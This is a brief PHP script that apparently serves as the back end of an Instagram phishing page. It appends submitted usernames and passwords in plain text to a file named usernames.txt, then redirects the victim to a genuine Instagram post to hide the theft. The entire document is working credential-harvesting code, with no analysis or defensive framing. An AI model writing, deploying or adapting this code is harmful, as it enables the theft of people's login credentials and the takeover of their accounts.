<?php

file_put_contents("usernames.txt", "Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.instagram.com/p/B3L2RuflltysB_6ZNH8zyG-uhFY60KAoe98W240');
exit();
